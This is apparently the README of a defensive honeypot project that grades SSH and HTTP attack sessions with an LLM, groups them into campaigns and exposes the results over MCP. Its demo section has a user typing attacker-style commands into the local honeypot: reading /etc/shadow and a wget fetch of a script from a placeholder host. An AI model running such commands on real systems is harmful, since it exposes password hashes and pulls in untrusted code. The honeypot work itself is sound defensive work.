# AI SOC Analyst

**Every session an LLM grades, every repeat attacker grouped into a campaign,
and every campaign answerable in plain English over MCP.** Most honeypots record
what an attacker typed and leave the judgement to you; this one does the
triage, the correlation, and the reporting, and then exposes the result to an
analyst agent instead of only to a human reading a console.

Attackers hit a low-interaction SSH or HTTP honeypot; a Mastra workflow grades
every session, enriches it with threat intelligence, and writes analyst-readable
incident reports.

[![CI](https://github.com/0xsan7/AI-SOC-Analyst-Honeypot/actions/workflows/ci.yml/badge.svg)](https://github.com/0xsan7/AI-SOC-Analyst-Honeypot/actions/workflows/ci.yml)
[![Gemini](https://img.shields.io/badge/LLM-Google%20Gemini-4285F4?style=flat-square&logo=googlegemini&logoColor=white)](https://ai.google.dev/gemini-api)
[![Mastra](https://img.shields.io/badge/framework-Mastra-8A2BE2?style=flat-square)](https://mastra.ai)
[![Node](https://img.shields.io/badge/node-22.13%2B-5FA04E?style=flat-square&logo=nodedotjs&logoColor=white)](https://nodejs.org)
[![TypeScript](https://img.shields.io/badge/typescript-6.0-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue?style=flat-square)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-66%20unit%20%2B%205%20integration-4EA1B3?style=flat-square)](#testing)

**Status:** feature-complete and verified. Not yet running on a public VPS — see
[Status](#status).

---

## Overview

Public ports are scanned continuously. Most of it is noise. Some of it is a real
operator working toward a foothold. Separating the two by hand is the tedious
part, and it does not scale past a handful of sessions a day.

This project automates the triage:

| Component | Behaviour |
| --- | --- |
| SSH honeypot | Low-interaction `ssh2` server. Accepts any credential, answers from a static table, records what was tried. |
| HTTP honeypot | Second listener for the traffic HTTP actually attracts: admin panels, `.env` and `.git` probes, traversal attempts. |
| Triage | Mastra workflow classifies each session (`noise`, `recon`, `credential_stuffing`, `active_exploit_attempt`) with an LLM-graded severity 1-5. |
| Enrichment | Geolocation and ASN via `ip-api.com`, optional AbuseIPDB reputation. Every lookup degrades to a warning, never a crash. |
| Correlation | Events from one source IP inside a 30-minute window collapse into a campaign, persisted in LibSQL. |
| Reports | Markdown incident reports generated when a campaign crosses severity 4 or 5 events, refreshed as it grows, and marked `closed` once it goes quiet. |
| MCP server | Exposes `get_recent_campaigns`, `get_campaign_detail`, and `ask_soc_agent` to any MCP client. |
| Dashboard | Live view of event volume, severity distribution, top sources, and campaign state. |

## How this compares

There are better honeypots. Being clear about that is more useful than
pretending otherwise.

**What the established tools do better**

| Tool | Where it wins |
| --- | --- |
| [Cowrie](https://github.com/cowrie/cowrie) | Years of production use, a full emulated Debian filesystem, working commands, and malware sample collection. Medium- and high-interaction modes let an attacker go much further before you see them. |
| [T-Pot](https://github.com/telekom-security/tpotce) | Twenty-plus honeypots in one deployment, including ICS/SCADA and container escapes, with the Elastic Stack and live attack maps already wired up. |
| [Dionaea](https://github.com/DinoTools/dionaea) | Protocol breadth: it answers real vulnerable services, so exploit payloads reach the honeypot instead of being filtered upstream. |
| [HonSSH](https://github.com/tnich/honssh) | Not a competitor. Archived in January 2023 and unmaintained, listed only because searches for SSH honeypots still surface it. |

In raw collection this project is the weakest of the three active options. It
covers two protocols, records typed commands rather than emulating a shell, and
has never run against live internet traffic. It is built for the step that comes
*after* collection.

**What it does differently**

- **LLM-graded severity.** Every session gets a classification and a 1-5 score
  with reasoning, not just a log line. `npm run seed` shows the whole path with
  no API key.
- **Campaign correlation.** Events from one IP inside a 30-minute window become
  a single incident that escalates in severity and closes after 24 hours idle.
  Cowrie and T-Pot log individual sessions; the grouping is left to you or to
  Elastic aggregations.
- **Deterministic reports.** A campaign crosses a threshold and a Markdown
  incident report is written, with no LLM in that step. Reports keep working
  when the Gemini quota runs out.
- **MCP exposure.** Three tools, including `ask_soc_agent`, so an analyst agent
  can query campaigns in plain English over stdio. This is the part none of the
  others do.
- **Structural no-execution.** No `child_process`, `spawn`, `eval`, or shell
  anywhere in the honeypot path — asserted by a test that scans the source and
  by a behavioural check against a live listener.

If you want broad protocol coverage and a decade of collected attacker
sessions, use T-Pot or Cowrie. If you want graded triage and a finished
incident from a handful of sessions, this is the tool for that. The honest
position is that they are complementary, not substitutes.

## Architecture

```mermaid
flowchart TD
  subgraph EDGE ["inbound traffic"]
    direction LR
    A["attacker<br/><b>ssh -p 2222</b> · <b>http :8080</b>"]
  end

  EDGE --> B["<b>Honeypots</b><br/>ssh2 + node:http<br/>accepts any credential<br/>static replies, no exec"]
  B -->|"data/events.jsonl"| C["<b>Normalizer</b> (zod)<br/>JSONL to validated AttackEvent<br/>malformed lines skipped"]
  C --> D["<b>Mastra triage workflow</b><br/>classify: noise / recon /<br/>credential_stuffing / active_exploit_attempt<br/>LLM-graded severity 1-5"]
  D --> E["<b>Enrich</b><br/>ip-api.com geo + ASN<br/>AbuseIPDB reputation (optional)"]
  E -->|"data/enriched.jsonl"| F["<b>Correlation</b> (LibSQL)<br/>same IP within 30 min to one campaign<br/>auto-close after 24h idle"]
  F -->|"report at severity >= 4 or >= 5 events"| G["<b>reports/*.md</b>"]
  G --> H["<b>dashboard</b><br/>npm run dashboard"]
  G --> I["<b>MCP server</b> (3 tools)<br/>npm run mcp"]

  classDef term fill:#1a1a1a,stroke:#4a4a4a,color:#e8e8e8
  classDef stage fill:#141414,stroke:#5a5a5a,color:#f0f0f0
  classDef out fill:#1c1408,stroke:#8a6d2f,color:#f5e6c8

  class A,E,G term
  class B,C,D,F,H,I stage
```

## Quick start

Requires **Node 22.13+**.

```bash
git clone https://github.com/0xsan7/AI-SOC-Analyst-Honeypot.git
cd Honeypot
npm install
cp .env.example .env      # add your GOOGLE_GENERATIVE_AI_API_KEY
npm run setup             # host keys, frontend build, demo data
```

`npm run setup` takes roughly 15 seconds on a warm npm cache and is idempotent.
It generates the honeypot host keys, installs and builds the `web/` frontend, and
seeds demo campaigns so there is something to look at before you have a key.

Get a free Gemini key at [aistudio.google.com/apikey](https://aistudio.google.com/apikey).
It begins with `AIza`. The key is only needed for live triage; the honeypot,
correlation, reporting, dashboard, and MCP server all work without it.

### Run it

Two terminals:

```bash
# terminal 1
npm run honeypot
```

```bash
# terminal 2
ssh -p 2222 root@127.0.0.1     # any password is accepted
whoami
cat /etc/shadow
wget http://10.0.0.1/x.sh

npm run pipeline               # triage what was captured
```

The honeypot answers from a static table. Nothing it is told is ever executed.

```
[5] active_exploit_attempt   127.0.0.1 user=root pass=admin123 cmds=4
[4] active_exploit_attempt   127.0.0.1 user=admin pass=password cmds=2
[3] credential_stuffing      127.0.0.1 user=test pass=test cmds=0
      warnings: skipped geo lookup for private IP; AbuseIPDB skipped: no key
```

### Without an API key

The free Gemini tier allows roughly 20 classifications a day. To exercise the
whole second half of the pipeline at no cost:

```bash
npm run seed        # 20 synthetic enriched events
npm run correlate   # group into campaigns, write reports
```

```
  198.51.100.23 sev5 active_exploit_attempt   -> campaign 9993a6d3 (6 events, max sev 5)
      REPORT: reports/campaign-9993a6d3-....md
```

### View it

```bash
npm run dashboard   # landing page at /, console at /dashboard
npm run mcp         # MCP server on stdio
npm run dev         # Mastra Studio at localhost:4111
```

The site serves two views: a React landing page at `/` and the SOC console at
`/dashboard`, both on `http://127.0.0.1:4173`.

![Landing page](docs/landing.png)

## Commands

| Command | Description |
| --- | --- |
| `npm run setup` | Host keys, frontend build, and demo data in one command |
| `npm run honeypot` | Start the SSH honeypot on `:2222` |
| `npm run honeypot:http` | Start the HTTP honeypot on `:8080` |
| `npm run pipeline` | Triage captured events through the LLM |
| `npm run correlate` | Group enriched events into campaigns, write reports |
| `npm run seed` | Seed 20 synthetic enriched events (no LLM calls) |
| `npm run dashboard` | Serve the site on `127.0.0.1:4173` |
| `npm run mcp` | MCP server on stdio (3 tools) |
| `npm run backup` | Consistent copy of the campaign store via `VACUUM INTO` |
| `npm run keys` | Regenerate honeypot host keys |
| `npm run dev` | Mastra Studio on `localhost:4111` |
| `npm run probe` | Drive synthetic SSH sessions at the honeypot |
| `bash scripts/demo-transcript.sh` | Regenerate the demo transcript below from a real run |
| `npm test` | Unit tests, LLM mocked (no API calls) |
| `npm run typecheck` | `tsc --noEmit` |
| `npm run test:all` | Every suite below, in order |
| `npm run test:mcp` | Real MCP client completes a handshake and calls tools |
| `npm run test:mcp-robustness` | Malformed and hostile tool calls return clean errors; the server survives all of them |
| `npm run test:pipeline` | Pipeline exits non-zero and explains why when it fails |
| `npm run test:autoclose` | Campaign auto-close persists across processes |
| `npm run test:http` | HTTP honeypot over a real socket, including hostile input |
| `npm run test:concurrency` | N simultaneous sessions, one event each |
| `npm run verify:honeypot` | No-execution invariant, against a running honeypot |
| `npm run test:ask` | `ask_soc_agent` over a real MCP connection, live model |
| `npm run test:studio` | Live trace recorded by Mastra Studio |

`npm test` also covers both of the above with a mocked model at no cost, so a
regression in either fails the default suite. The live variants prove the
wiring against the real model; the mocked ones keep the guarantee permanent.

## MCP server

Three tools are exposed over stdio.

| Tool | Purpose |
| --- | --- |
| `get_recent_campaigns` | List recent campaigns with severity and event counts |
| `get_campaign_detail` | One campaign plus every enriched event in it |
| `ask_soc_agent` | Free-text questions, answered from stored data only |

```bash
npm run mcp
```

Register it with any MCP client:

```json
{
  "mcpServers": {
    "soc-analyst": {
      "command": "npm",
      "args": ["run", "mcp"],
      "cwd": "/absolute/path/to/Honeypot"
    }
  }
}
```

### Version constraint

`@mastra/mcp` is pinned to **1.18.0**. Do not upgrade to 2.x without reading
this first.

The 2.x line depends on `@modelcontextprotocol/server@2.0.0`, which speaks only
the `2026-07-28` protocol and additionally requires a per-request envelope claim
in `params._meta`. That server reports `supported: ["2026-07-28"]` while
rejecting `2026-07-28` from a conforming client, and no published client SDK
supports the version at all, since the newest tops out at `2025-11-25`. The
result is a server that no real client can connect to.

1.18.0 pulls in `@modelcontextprotocol/server-legacy`, which negotiates the
2025-era protocols that Claude Desktop, Cursor, and VS Code actually speak.

`npm run test:mcp` proves this over the wire. An earlier in-process test passed
while no client could connect at all, so the wire test is the one that counts.

## Configuration

Secrets are read from `.env`, never hardcoded. `.env.example` documents every
variable.

| Variable | Required | Default | Purpose |
| --- | --- | --- | --- |
| `GOOGLE_GENERATIVE_AI_API_KEY` | for live triage | none | Gemini key for classification |
| `ABUSEIPDB_API_KEY` | no | none | Reputation scores; skipped when absent |
| `HONEYPOT_PORT` | no | `2222` | SSH honeypot port |
| `HONEYPOT_BIND` | no | `127.0.0.1` | Set `0.0.0.0` only on infrastructure you own |
| `HTTP_HONEYPOT_PORT` | no | `8080` | HTTP honeypot port |
| `HTTP_HONEYPOT_BIND` | no | `127.0.0.1` | Set `0.0.0.0` only on infrastructure you own |
| `HONEYPOT_LOG` | no | `data/events.jsonl` | Event log path |
| `HONEYPOT_VERBOSE` | no | off | Log every HTTP request, not just probes |
| `LOG_MAX_BYTES` | no | `52428800` | Rotate the event log at 50 MB |
| `LOG_MAX_FILES` | no | `5` | Rotated generations to keep (~250 MB ceiling) |
| `MAX_CONNECTIONS` | no | `64` | Concurrent sessions per listener |
| `MAX_PER_IP` | no | `8` | Concurrent sessions from one source IP |
| `CAMPAIGN_WINDOW_MS` | no | `1800000` | Correlation window (30 minutes) |
| `CAMPAIGN_IDLE_CLOSE_MS` | no | `86400000` | Auto-close an idle campaign after 24 hours |
| `REPORT_DIR` | no | `reports/` | Where reports are written |
| `DASHBOARD_PORT` | no | `4173` | Dashboard port |
| `BACKUP_DIR` | no | `backup/` | Where `npm run backup` writes |
| `TURSO_DATABASE_URL` | no | `file:./soc-analyst.db` | Remote LibSQL, or local file |

## Security model

This is a defensive tool. It observes traffic directed at infrastructure the
operator controls, and does not scan, probe, or interact with third-party
systems.

**Commands are recorded, never executed.** Neither honeypot contains
`child_process`, a shell, `spawn`, `eval`, or `new Function`. Attacker input is
stored as strings and answered from static lookup tables. The guarantee is
structural rather than policy-based: there is no code path from a request to a
real process, and it does not depend on any LLM or runtime judgement.
`npm run test:http` asserts this by scanning the source, and
`npm run verify:honeypot` asserts the observable behaviour against a live
honeypot.

Beyond that:

- **Loopback by default.** Both listeners bind `127.0.0.1`. Binding `0.0.0.0`
  is an explicit decision and belongs only on infrastructure you own.
- **Bounded resource use.** The event log rotates by size, so a busy port
  cannot fill the disk. Connections are capped per listener and per source IP;
  at capacity a new connection is refused rather than dropping a live session,
  since a scanner will retry but a killed session loses its capture.
- **No secrets committed.** `.env`, host keys, databases, event logs, and
  generated reports are all gitignored.
- **Free-tier geolocation.** Uses the `ip-api.com` free tier with retry and
  backoff on 429s.
- **Synthetic credentials in examples.** The `admin123` and `password` values
  in this README and in `examples/` are generated by the test probe. Nothing
  was scraped from a real attacker.
- **Passwords captured from basic auth are never logged.** The username is
  retained for attribution; the password is discarded.

## Rate limits

Gemini's free tier allows roughly 20 classification requests per day on
`gemini-3.5-flash`. When the quota is exhausted the pipeline logs the failure
for that event, continues with the rest, and writes everything that did
succeed.

If nothing could be enriched, the command exits non-zero so a script or cron
job notices, and prints the cause:

```
Enriched 0/20 event(s) -> data/enriched.jsonl
PIPELINE FAILED: no events were enriched.
  Gemini quota exhausted. The free tier allows ~20 requests/day -- wait for the
  reset, or run `npm run seed` to demo without an LLM.
```

Correlation and reporting make no LLM calls, so they are unaffected by quota.
For higher throughput, use a billing-enabled key or change `CLASSIFIER_MODEL` in
`src/mastra/triage.ts`.

## Testing

```bash
npm run test:all
```

| Suite | What it proves |
| --- | --- |
| `npm test` | 66 unit tests across 9 files, LLM mocked, no API calls |
| `npm run typecheck` | `tsc --noEmit` |
| `npm run test:mcp` | A real MCP client completes a handshake, lists all three tools, and calls two against a seeded store |
| `npm run test:mcp-robustness` | Malformed and hostile tool calls return clean errors; the server survives all of them |
| `npm run test:pipeline` | With the API key removed, the pipeline exits non-zero, writes nothing, and prints a fix |
| `npm run test:autoclose` | An idle campaign becomes `closed`, confirmed by a separate process reading the store |
| `npm run test:http` | The HTTP honeypot serves decoys, records events, survives hostile input, and contains no execution primitive |
| `npm run verify:honeypot` | The no-execution invariant, against a running honeypot |
| `npm run test:concurrency` | N simultaneous sessions each produce exactly one uniquely identified event |

The boundary suites exist because those defects were invisible to unit tests.
The original in-process MCP test passed while no MCP client could connect. The
pipeline exited `0` after writing zero enriched events. The honeypot verifier
exited `0` with nothing listening. Three separate cases of a green result that
verified nothing, which is the failure mode worth engineering against.

[TESTING.md](TESTING.md) documents manual verification for each acceptance
criterion, including what a genuine pass looks like.

## Deployment

[DEPLOY.md](DEPLOY.md) covers running this on a public VPS: provider selection,
firewall rules, systemd units with filesystem sandboxing, backups, and what must
not be exposed.

The honeypots bind `0.0.0.0` deliberately. The dashboard and MCP server have no
authentication and must stay on `127.0.0.1`, reachable over a tunnel:

```bash
ssh -N -L 4173:127.0.0.1:4173 you@host
```

A tunnel is not a substitute for a real VPS. Mass scanners, Shodan, and Censys
enumerate IP address space; they do not resolve tunnel hostnames, so a
honeypot behind ngrok or similar is never discovered and collects no unsolicited
traffic.

## Project layout

```
src/
  honeypot/
    ssh-server.ts          low-interaction SSH honeypot
    http-server.ts         low-interaction HTTP honeypot
    event-log.ts           size-based rotation, bounded disk use
    connection-limiter.ts  concurrency cap, per listener and per IP
  mastra/
    index.ts               Mastra registration (agents, tools, workflows)
    schemas.ts             zod schemas: AttackEvent / EnrichedEvent / Campaign
    normalizer.ts          JSONL -> validated events, rotation-aware tailing
    triage.ts              classify -> enrich workflow
    enrich.ts              geo / ASN / reputation, degrades gracefully
    store.ts               LibSQL campaign store with auto-close
    report.ts              deterministic markdown report generator
    mcp-server.ts          MCP exposure (3 tools)
    agents/soc-agent.ts    memory-backed analyst agent
    public/dashboard.html  SOC console (no build step)
scripts/                   pipeline, correlation, seeding, and 8 test harnesses
tests/                     66 unit tests across 9 files
web/                       React + Vite landing page (separate build)
examples/                  committed sample reports, synthetic data only
```

`DECISIONS.md` records the reasoning behind design calls, including several that
were reversed once their consequences were measured. `PRD.md` is the original
specification.

| Document | What it covers |
| --- | --- |
| [TESTING.md](TESTING.md) | How to verify each criterion by hand, and the verification standard |
| [DEPLOY.md](DEPLOY.md) | Public VPS setup, firewall rules, systemd units, backups |
| [DECISIONS.md](DECISIONS.md) | Design calls and the ones that were reversed, with reasons |
| [CONTRIBUTING.md](CONTRIBUTING.md) | How to contribute, and what the bar is |
| [SECURITY.md](SECURITY.md) | Reporting a vulnerability, and what is deliberately out of scope |
| [PRD.md](PRD.md) | The original specification |

## Status

Complete and verified end to end: both honeypots, the triage workflow,
correlation with auto-close, deterministic reporting, the MCP server, the
dashboard, and the deployment documentation.

All six PRD acceptance criteria are verified by real execution rather than
inspection. Two of them (`ask_soc_agent` over MCP, and Studio traces) were
silently broken until 2026-09-27 and are now covered by `npm run test:ask` and
`npm run test:studio`. Both need a live Gemini key and a running Studio, so
they sit outside `test:all`.

Not yet done:

- No demo recording of the console. `npm run test:studio` proves the trace
  data exists; it is not a video. See [Recording a demo](#recording-a-demo).
- Reputation enrichment is wired and degrades correctly, but the real path has
  **never been run against a live AbuseIPDB key** — only the no-key degraded
  path has been executed. Getting a key is free
  ([Individual plan](https://www.abuseipdb.com/pricing), 1,000 checks/day, no
  card) but it requires registering an account and issuing the key from the
  account's API Settings page, which the maintainer must do. To close it:
  copy the key into `.env` as `ABUSEIPDB_API_KEY` and run `npm run pipeline`.
  Until then, treat reputation scores in any captured output as unverified.

An earlier version of this file also claimed the seed data did not produce
single-event campaigns. That was wrong: `npm run seed && npm run correlate`
produces **14 single-event campaigns out of 15**, because only the headline
attacker appears more than once inside the 30-minute window. Verified by
running it against an isolated database, not inferred from the test suite.

### Recording a demo

There is no video, and none can be produced by the tooling in this repository:
capturing the browser console needs a GUI screen recorder, which automation
does not have. Rather than ship a placeholder that looks like a demo, here is
the reproducible text transcript and the exact steps a human needs for the
video.

The transcript below is real output, captured by
[`scripts/demo-transcript.sh`](scripts/demo-transcript.sh). Regenerate it with
one command after any output change:

```bash
bash scripts/demo-transcript.sh
```

```
$ npm run correlate
  198.51.100.23 sev3 credential_stuffing      -> campaign e7e97d6c (1 events, max sev 3)  REPORT: reports/campaign-e7e97d6c-4492-4acf-b273-e30fe3fb3087.md
  198.51.100.23 sev3 recon                    -> campaign e7e97d6c (2 events, max sev 3)  REPORT: reports/campaign-e7e97d6c-4492-4acf-b273-e30fe3fb3087.md
  198.51.100.23 sev3 recon                    -> campaign e7e97d6c (3 events, max sev 3)  REPORT: reports/campaign-e7e97d6c-4492-4acf-b273-e30fe3fb3087.md
  198.51.100.23 sev4 active_exploit_attempt   -> campaign e7e97d6c (4 events, max sev 4)  REPORT: reports/campaign-e7e97d6c-4492-4acf-b273-e30fe3fb3087.md
  198.51.100.23 sev5 active_exploit_attempt   -> campaign e7e97d6c (5 events, max sev 5)  REPORT: reports/campaign-e7e97d6c-4492-4acf-b273-e30fe3fb3087.md
  198.51.100.23 sev5 active_exploit_attempt   -> campaign e7e97d6c (6 events, max sev 5)  REPORT: reports/campaign-e7e97d6c-4492-4acf-b273-e30fe3fb3087.md

15 campaign(s) stored (15 open).
```

Six SSH sessions from one IP collapse into a single campaign whose severity
climbs from 3 to 5 as the attacker escalates, and the report is written
deterministically. To see it with the console:

```bash
npm run seed        # 20 synthetic events, no LLM calls
npm run correlate   # group into campaigns, write reports/
npm run dashboard   # http://127.0.0.1:4173/dashboard
```

For a screen recording, capture those three commands plus the dashboard
showing the campaign list and one expanded incident report. Roughly 60–90
seconds. Two honest constraints on the result: the data is synthetic, so say
so if the video is published, and the honeypots bind to `127.0.0.1` by
default, so there is no real attacker traffic in it yet — that arrives only
after public deployment, which is deliberately a separate decision.


## Contributing

Pull requests are welcome. The bar is specific: changes must be verifiable and
claims must match what the code actually does. Before opening one, read
[CONTRIBUTING.md](CONTRIBUTING.md) — particularly the rule that a test which
does not call the thing it is named for is not a test of it.

Security findings go to [SECURITY.md](SECURITY.md), not a public issue.

## License

Apache-2.0. See [LICENSE](LICENSE).
